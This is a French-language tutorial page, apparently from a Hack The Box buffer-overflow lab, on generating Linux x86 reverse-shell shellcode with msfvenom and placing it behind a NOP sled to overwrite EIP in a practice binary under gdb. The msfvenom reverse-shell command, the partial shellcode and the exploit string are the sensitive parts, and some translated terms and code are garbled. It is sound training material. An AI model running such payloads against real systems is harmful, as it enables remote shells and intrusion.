Génération de shellcode
====================

* * * * *

Nous avons déjà appris à connaître l'outil `msfvenom` avec lequel nous avons généré la longueur approximative de notre shellcode. Nous pouvons maintenant utiliser à nouveau cet outil pour générer le shellcode réel, ce qui oblige le processeur de notre système cible à exécuter la commande que nous voulons avoir.

Mais avant de générer notre shellcode, nous devons nous assurer que les composants et propriétés individuels correspondent au système cible. Par conséquent, nous devons prêter attention aux domaines suivants :

- "Architecture"
- `Plate-forme`
- "Mauvais personnages"

#### Syntaxe MSFvenom

Syntaxe MSFvenom

```
dsgsec@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" -- out <nom de fichier>

```

#### MSFvenom - Générer un shellcode

MSFvenom - Générer un shellcode

```
dsgsec@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20 " --out shellcode

11 encodeurs compatibles trouvés
Tentative d'encodage de la charge utile avec 1 itérations de x86/shikata_ga_nai
x86/shikata_ga_nai a réussi avec la taille 95 (itération=0)
x86/shikata_ga_nai choisi avec la taille finale 95
Taille de la charge utile : 95 octets
Taille finale du fichier c : 425 octets
Enregistré sous : shellcode

```

#### Shellcode

Shellcode

```
dsgsec@htb[/htb]$ cat shellcode

char non signé buf[] =
"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"
"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"
<SNIP>

```

Maintenant que nous avons notre shellcode, nous l'ajustons pour n'avoir qu'une seule chaîne, puis nous pouvons adapter et soumettre à nouveau notre exploit simple.

#### Remarques

Remarques

```
    Tampon = "\x55" * (1040 - 124 - 95 - 4) = 817
      NOP = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
       EIP = "\x66" * 4'

```

#### Exploiter avec Shellcode

Exploiter avec Shellcode

```
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>.. .\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

Le programme en cours de débogage a déjà été lancé.
Commencer depuis le début ? (o ou n) o

Programme de démarrage : /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4. ..<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

Point d'arrêt 1, 0x56555551 dans bowfunc ()

```

Ensuite, nous vérifions si les premiers octets de notre shellcode correspondent aux octets après le NOPS.

#### La pile

La pile

```
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd64c : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd654 : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd65c : 0x90 0x90 0xda 0xca 0xba 0xe4 0x11 0xd4
# |----> Le shellcode commence
<SNIP>

```